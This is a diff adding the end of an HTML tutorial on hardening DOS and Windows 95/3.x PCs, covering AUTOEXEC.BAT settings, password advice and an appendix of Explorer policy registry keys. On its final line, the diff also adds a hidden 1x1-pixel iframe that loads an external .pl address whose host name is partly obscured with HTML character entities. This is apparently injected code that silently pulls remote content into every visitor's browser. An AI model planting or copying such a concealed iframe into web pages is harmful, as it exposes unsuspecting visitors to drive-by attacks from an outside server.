+    with CTTY NUL, and then have CTTY CON as the last line. This prevents breaking 
+    out of autoexec.bat</li>
+  <li>If you use DriveSpace compression, add the following line to your DRVSPACE.INI 
+    file:<br>
+    SWITCHES=/F /N</li>
+  <li>Add the line:<br>
+    BREAK OFF<br>
+    This reduces the number of chances you have to break out of AUTOEXEC.BAT, 
+    all though it doesn't switch it off entirely</li>
+  <li>Set up a DOS-based Security TSR</li>
+  <li>Make sure you cannot access the floppy drive without a password, and that 
+    it allows for write-protection.</li>
+  <li>Make sure it allows for password protection.</li>
+  <li>Set up a Windows-Based Security program</li>
+  <li>Make sure you can control which features of Windows you can limit or disable.</li>
+  <li>Make sure it allows for password protection.</li>
+  <li>Install Windows Security Policies using Policy Editor (see Appendix)</li>
+  <li> Install an encrypted filesystem program. (i.e., CryptDisk)</li>
+  <li>This will prevent access to the computer and files on the hard disk unless 
+    the password is entered. It will render your data unaccessible even if the 
+    hard disk is extracted from the system.</li>
+  <li>Delete the following DOS programs (or move them to a floppy):<br>
+    FORMAT<br>
+    DELTREE<br>
+    SUBST<br>
+    JOIN<br>
+    BACKUP<br>
+    RESTORE<br>
+    ATTRIB<br>
+    MODE</li>
+</ol>
+<p><br>
+  <b><font size="3"><a name="36"></a>Passwords</font></b><br>
+  <br>
+  Passwords are generally the weakest link in the security chain. When choosing 
+  a password, remember these tips:</p>
+<p>Do NOT choose something obvious: Swear words, your birthdate, topics pertaining 
+  to what you do and/or your interests are are examples of BAD passwords.</p>
+<p>A Good Password is one that is totally random. To pick a password, try this: 
+  Grab a dictionary. Close your eyes, and flip to a random page. With your eyes 
+  still closed, put your finger on a random spot on this page. Remember the word, 
+  and do this again. Combine the two words, and append a three-digit number to 
+  the end. You also might want to intersperse non-alphanumeric characters into 
+  the password in random ways, such as an odd dash or apostrophe here and there.</p>
+<p>Also, NEVER write your password down. Always keep it in your head. A simple 
+  Post-It note on your monitor can bring down all the security that you so meticulously 
+  set up!</p>
+<p>A good password system hides the passwords from everyone, including the system 
+  administrators. This means that the sys admins cannot tell if the users are 
+  putting in weak passwords.</p>
+<p>One final note: When designing a security system, be sure to take the user 
+  into account. If a system is of such high-grade security that it is a nuisance 
+  to use, people will always find the lazy way to do it. (Post-it Notes...)<br>
+  <br>
+</p>
+<hr>
+<p><font size="4"><b><a name="37"></a>Appendix ( (c) Njan 1999 ) </b></font></p>
+<ol>
+  <li>First, logon on as the default user (push the ESC key)</li>
+  <li>Click Start/Run type REGEDIT and push ENTER</li>
+  <li>Go to the directory: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer 
+    (If the key Explorer doesn't exist, you'll have to make it)</li>
+  <li>Create new binary values for:<br>
+    NoClose If set to &quot;01 00 00 00&quot; then you can't Shut Down windows 
+    (you can logoff)<br>
+    NoDesktop If set to &quot;01 00 00 00&quot; then there's no icons on the desktop 
+    at all)<br>
+    NoDrives If set to &quot;ff ff ff ff&quot; then you can't access any drive 
+    from windows explorer<br>
+    NoFavoritesMenu If set to &quot;01 00 00 00&quot; then there's no Favorites 
+    menu on the Start Bar<br>
+    NoFind If set to &quot;01 00 00 00&quot; then there's no Find menu on the 
+    Start <br>
+    NoFolderOptions If set to &quot;01 00 00 00&quot; then you can't change folder 
+    options<br>
+    NoLogoff If set to &quot;01 00 00 00&quot; then you can't log off<br>
+    NoRecentDocsMenu If set to &quot;01 00 00 00&quot; then there's no Recent 
+    Documents Menu on the Start Bar<br>
+    NoRun If set to &quot;01 00 00 00&quot; then there's no Run command on the 
+    Start Bar<br>
+    NoSaveSettings If set to &quot;01 00 00 00&quot; then and window positions 
+    will not be saved<br>
+    NoSetActiveDesktop If set to &quot;01 00 00 00&quot; then you can't configure 
+    Active Desktop<br>
+    NoSetFolders If set to &quot;01 00 00 00&quot; then you can't edit the ShortCuts 
+    which are on the Start Bar<br>
+    NoSetTaskbar If set to &quot;01 00 00 00&quot; then you get into Control Panel<br>
+    NoViewContextMenu If set to &quot;01 00 00 00&quot; then you can't right-click 
+    on the desktop<br>
+    NoFile If set to &quot;01 00 00 00&quot; then removes the &quot;File&quot; 
+    menu option on explorer<br>
+    EditLevel If set to &quot;0x00000004 (4)&quot; then disables the ability to 
+    create/delete shortcuts<br>
+    AddPrinter If set to &quot;01 00 00 00&quot; then you can't add a printer<br>
+    DeletePrinter If set to &quot;01 00 00 00&quot; then you can't delete a printer<br>
+    NoDriveTypeAutoRun If set to &quot;01 00 00 00&quot; stops windows from automaticly 
+    playing/loading CDs<br>
+    NoNetHood If set to &quot;01 00 00 00&quot; disables the network neighbourhood<br>
+    NoStartBanner If set to &quot;01 00 00 00&quot; removes that annoying &quot;Click 
+    here to begin&quot; banner</li>
+  <li>Go to the directory: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Network 
+    (If the key Explorer doesn't exist, you'll have to make it)<br>
+    NoEntireNetwork If set to &quot;01 00 00 00&quot; then disables all access 
+    to the network<br>
+    NoFileSharingControl If set to &quot;01 00 00 00&quot; stops you changing 
+    the sharing controls on your computer<br>
+    NoNetSetup If set to &quot;01 00 00 00&quot; disables you changing the network 
+    settings<br>
+    NoNetSetupIDPage If set to &quot;01 00 00 00&quot; then you can't edit the 
+    computers ID<br>
+    NoNetSetupSecurityPage If set to &quot;01 00 00 00&quot; then you can't setup 
+    security on the network</li>
+  <li>Go to the directory: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System 
+    (If the key Explorer doesn't exist, you'll have to make it)<br>
+    NoConfigPage 'My computer right clicking<br>
+    NoDevMgrPage<br>
+    NoDispAppearancePage<br>
+    NoDispBackgroundPage<br>
+    NoDispCPL<br>
+    NoDispScrSavPage<br>
+    NoDispSettingPage<br>
+    NoFileSysPage<br>
+    NoProfilePage<br>
+    NoSecCPL<br>
+    NoVirtMemPage</li>
+  <li>Then using these you can log on as each user and change their settings.</li>
+  <li>Other places in the registry:<br>
+    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer 
+    (Restrictions in here affect all users)</li>
+</ol>
+<p>If you have Windows 3.0, 3.1 or 3.11</p>
+<ol>
+  <li> Load up NotePad</li>
+  <li> Open PROGMAN.INI</li>
+  <li> At the bottom of the file, add these lines:<br>
+    [Restrictions]<br>
+    EditLevel=4 Chose an edit level restrict 1 - 4, 1 being least restriction, 
+    4 being most.<br>
+    NoRun=1 Get rid of the &quot;Run&quot; option<br>
+    NoClose=1 Means you can't exit Windows<br>
+    NoSaveSettings=1 Means you can't save Window positions<br>
+    NoFile=1</li>
+  <li>To stop access to the Control Panel, then just delete the icons</li>
+</ol>
+<p>To partialy protect DOS access while booting, you can disable/reenable the 
+  key board. Put the command: CTTY &gt; NUL at the top of your AUTOEXEC.BAT and 
+  then CTTY &gt; CON at the end of your AUTOEXEC.BAT</p>
+<p>Then to stop access to DOS by crashing Windows, add these commands to the bottom 
+  of your AUTOEXEC.BAT<br>
+  :WINLOOP<br>
+  C:\WIN\WIN.COM<br>
+  GOTO WINLOOP</p>
+<p>Note: These registry keys took months of work to find out. Do NOT redistribute 
+  under or your own name, or die a horrible death. Appendix may be distributed 
+  with Njan's permission. Main Tutorial? I don't know. Ask the bloke that made 
+  it.</p>
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
